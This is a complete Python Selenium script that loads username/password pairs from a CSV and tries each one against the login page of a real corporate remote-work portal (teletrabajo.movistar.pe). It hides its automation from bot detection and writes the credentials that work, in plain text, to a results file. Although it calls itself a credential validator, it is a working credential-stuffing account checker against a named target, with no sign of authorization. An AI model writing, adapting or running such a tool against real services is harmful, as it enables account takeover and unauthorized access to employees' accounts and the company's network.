import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tqdm import tqdm
from colorama import Fore, Style, init
import os
import logging
from datetime import datetime

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('login_results.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Inicializar colores
init(autoreset=True)

# URL del login
URL = "https://teletrabajo.movistar.pe"

def cargar_credenciales_csv():
    """Cargar credenciales desde el archivo CSV"""
    try:
        if os.path.exists("credenciales.csv"):
            # Intentar con múltiples codificaciones y separadores
            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
            separadores = [',', ';', '\t', '|']
            df = None
            encoding_usado = None
            separador_usado = None
            
            for encoding in encodings:
                for sep in separadores:
                    try:
                        df = pd.read_csv("credenciales.csv", encoding=encoding, sep=sep)
                        # Verificar que tenga al menos 2 columnas
                        if len(df.columns) >= 2:
                            encoding_usado = encoding
                            separador_usado = sep
                            break
                    except:
                        continue
                if df is not None and len(df.columns) >= 2:
                    break
            
            if df is None or len(df.columns) < 2:
                print("❌ No se pudo leer el archivo correctamente")
                print("💡 Verifica que el archivo tenga al menos 2 columnas")
                print("💡 Formatos aceptados: CSV con coma (,) punto y coma (;) o tabulación")
                return None
            
            sep_nombre = {',' : 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
            print(f"✅ Archivo leído con codificación: {encoding_usado} y separador: {sep_nombre.get(separador_usado, separador_usado)}")
            logger.info(f"CSV leído - Encoding: {encoding_usado}, Separador: {separador_usado}")
            
            # Mostrar columnas encontradas
            print(f"📋 Columnas encontradas en el CSV: {df.columns.tolist()}")
            logger.info(f"Columnas del CSV: {df.columns.tolist()}")
            
            # Verificar que el CSV tenga las columnas necesarias
            columnas_lower = [col.lower().strip() for col in df.columns]
            
            # Buscar columnas de usuario y password con nombres variados
            col_usuario = None
            col_password = None
            
            for i, col in enumerate(df.columns):
                col_lower = col.lower().strip()
                # Detectar columna de usuario
                if col_lower in ['usuario', 'user', 'username', 'login', 'correo', 'email']:
                    col_usuario = col
                # Detectar columna de password
                if col_lower in ['password', 'pass', 'contraseña', 'contrasena', 'clave', 'pwd']:
                    col_password = col
            
            # Si no se encontraron, usar las primeras dos columnas
            if col_usuario is None or col_password is None:
                if len(df.columns) >= 2:
                    col_usuario = df.columns[0]
                    col_password = df.columns[1]
                    print(f"⚠️ Usando primera columna como usuario: '{col_usuario}'")
                    print(f"⚠️ Usando segunda columna como password: '{col_password}'")
                    logger.warning(f"Columnas auto-asignadas: {col_usuario}, {col_password}")
                else:
                    print("❌ El CSV debe tener al menos 2 columnas")
                    print(f"   Columnas actuales: {df.columns.tolist()}")
                    return None
            
            # Renombrar columnas
            df = df.rename(columns={col_usuario: 'usuario', col_password: 'password'})
            
            # Limpiar espacios en blanco
            df['usuario'] = df['usuario'].astype(str).str.strip()
            df['password'] = df['password'].astype(str).str.strip()
            
            # Eliminar filas vacías
            df = df.dropna(subset=['usuario', 'password'])
            
            print(f"✅ Cargadas {len(df)} credenciales del archivo 'credenciales.csv'")
            logger.info(f"Credenciales cargadas: {len(df)}")
            return df
        else:
            print("❌ No se encontró el archivo 'credenciales.csv'")
            print("📝 Crea un archivo CSV con el formato:")
            print("usuario,password")
            print("user1,pass1")
            print("user2,pass2")
            return None
    except Exception as e:
        print(f"❌ Error al cargar credenciales: {e}")
        logger.error(f"Error cargando credenciales: {e}")
        return None

def configurar_driver():
    """Configurar el navegador Chrome con opciones optimizadas"""
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-extensions")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    
    # Opcional: modo headless (descomenta si quieres que corra sin ventana visible)
    # options.add_argument("--headless")
    
    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        logger.info("✅ Navegador configurado exitosamente")
        return driver
    except Exception as e:
        print(f"❌ Error al configurar el navegador: {e}")
        logger.error(f"Error configurando navegador: {e}")
        return None

def intentar_login(driver, wait, usuario, password):
    """Intentar login con las credenciales proporcionadas"""
    try:
        logger.info(f"🚀 Intentando login para: {usuario}")
        
        # Cargar la página
        driver.get(URL)
        time.sleep(2)
        
        # Esperar y encontrar campo de usuario
        logger.info("👤 Ingresando usuario...")
        input_user = wait.until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="login"]'))
        )
        input_user.clear()
        input_user.send_keys(usuario)
        time.sleep(0.5)
        
        # Encontrar campo de contraseña
        logger.info("🔒 Ingresando contraseña...")
        input_pass = wait.until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]'))
        )
        input_pass.clear()
        input_pass.send_keys(password)
        time.sleep(0.5)
        
        # Hacer clic en el botón de login
        logger.info("🔘 Haciendo clic en botón de login...")
        boton_login = wait.until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]'))
        )
        boton_login.click()
        
        # Esperar a que la página procese el login
        time.sleep(3)
        
        # Verificar el resultado del login
        resultado = verificar_resultado_login(driver, wait)
        
        if resultado:
            logger.info(f"✅ LOGIN EXITOSO: {usuario}")
            return True
        else:
            logger.info(f"❌ LOGIN FALLIDO: {usuario}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Error en login para {usuario}: {e}")
        return False

def verificar_resultado_login(driver, wait):
    """Verificar si el login fue exitoso"""
    try:
        time.sleep(2)
        url_actual = driver.current_url.lower()
        
        # Verificar mensajes de error comunes
        mensajes_error = [
            "//div[contains(@class, 'error')]",
            "//span[contains(@class, 'error')]",
            "//p[contains(@class, 'error')]",
            "//div[contains(text(), 'incorrecta')]",
            "//div[contains(text(), 'inválido')]",
            "//div[contains(text(), 'error')]",
            "//*[contains(text(), 'usuario o contraseña')]",
            "//*[contains(text(), 'credenciales incorrectas')]"
        ]
        
        for selector in mensajes_error:
            try:
                elemento_error = driver.find_elements(By.XPATH, selector)
                if elemento_error and any(e.is_displayed() for e in elemento_error):
                    logger.info("🚫 Mensaje de error detectado en pantalla")
                    return False
            except:
                continue
        
        # Verificar si seguimos en la página de login
        if "login" in url_actual or driver.current_url == URL:
            logger.info("⚠️ Aún en página de login")
            return False
        
        # Verificar si hay elementos que indiquen login exitoso
        # (ajusta estos selectores según la página real después del login)
        indicadores_exito = [
            "//div[contains(@class, 'dashboard')]",
            "//div[contains(@class, 'home')]",
            "//a[contains(text(), 'Cerrar sesión')]",
            "//a[contains(text(), 'Logout')]",
            "//button[contains(text(), 'Salir')]"
        ]
        
        for selector in indicadores_exito:
            try:
                elementos = driver.find_elements(By.XPATH, selector)
                if elementos and any(e.is_displayed() for e in elementos):
                    logger.info("✅ Indicador de login exitoso detectado")
                    return True
            except:
                continue
        
        # Si la URL cambió y no hay errores, considerarlo exitoso
        if driver.current_url != URL and "login" not in url_actual:
            logger.info("✅ URL cambió, considerando login exitoso")
            return True
        
        logger.info("❓ Estado incierto del login")
        return False
        
    except Exception as e:
        logger.error(f"Error verificando resultado: {e}")
        return False

def guardar_credenciales_exitosas(usuarios_exitosos):
    """Guardar las credenciales exitosas en un archivo CSV"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        nombre_archivo = f"credenciales_exitosas_{timestamp}.csv"
        
        df = pd.DataFrame(usuarios_exitosos, columns=['usuario', 'password', 'fecha_hora'])
        df.to_csv(nombre_archivo, index=False, encoding='utf-8')
        
        print(f"\n💾 Credenciales exitosas guardadas en: {nombre_archivo}")
        logger.info(f"Archivo guardado: {nombre_archivo}")
        
        return nombre_archivo
    except Exception as e:
        print(f"❌ Error al guardar credenciales: {e}")
        logger.error(f"Error guardando credenciales: {e}")
        return None

def main():
    """Función principal del programa"""
    print(Fore.CYAN + "="*70)
    print(Fore.CYAN + "🚀 VALIDADOR DE CREDENCIALES - TELETRABAJO MOVISTAR PERÚ")
    print(Fore.CYAN + "📋 Procesando credenciales desde credenciales.csv")
    print(Fore.CYAN + "="*70)
    
    # Cargar credenciales
    credenciales = cargar_credenciales_csv()
    if credenciales is None or len(credenciales) == 0:
        return
    
    print(f"\n📊 Total de credenciales a probar: {len(credenciales)}")
    print("\n🔧 Configurando navegador...")
    
    # Configurar driver
    driver = configurar_driver()
    if driver is None:
        return
    
    wait = WebDriverWait(driver, 15)
    usuarios_exitosos = []
    
    try:
        # Procesar cada credencial
        for idx, row in tqdm(
            credenciales.iterrows(),
            total=len(credenciales),
            desc="🔄 Probando credenciales"
        ):
            usuario = row["usuario"]
            password = row["password"]
            
            print(f"\n" + "="*70)
            print(f"👤 PROBANDO: {usuario}")
            print("="*70)
            
            # Intentar login
            resultado = intentar_login(driver, wait, usuario, password)
            
            if resultado:
                fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                usuarios_exitosos.append((usuario, password, fecha_hora))
                print(Fore.GREEN + f"✅ LOGIN EXITOSO: {usuario}")
            else:
                print(Fore.RED + f"❌ LOGIN FALLIDO: {usuario}")
            
            # Pequeña pausa entre intentos
            time.sleep(2)
        
        # Mostrar resumen
        print("\n" + "="*70)
        print("📊 RESUMEN DE RESULTADOS")
        print("="*70)
        print(f"Total probadas: {len(credenciales)}")
        print(f"Exitosas: {len(usuarios_exitosos)}")
        print(f"Fallidas: {len(credenciales) - len(usuarios_exitosos)}")
        
        # Guardar credenciales exitosas
        if usuarios_exitosos:
            print(f"\n✅ Credenciales exitosas encontradas:")
            for usuario, password, fecha in usuarios_exitosos:
                print(f"   - {usuario} | {password} | {fecha}")
            
            guardar_credenciales_exitosas(usuarios_exitosos)
        else:
            print("\n❌ No se encontraron credenciales válidas")
            
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⚠️ Programa interrumpido por el usuario")
        logger.warning("Programa interrumpido por el usuario")
    except Exception as e:
        print(Fore.RED + f"\n❌ Error general: {e}")
        logger.error(f"Error general: {e}")
    finally:
        print("\n🔒 Cerrando navegador...")
        driver.quit()
        print("✅ Programa finalizado")
        logger.info("Programa finalizado")

if __name__ == "__main__":
    main()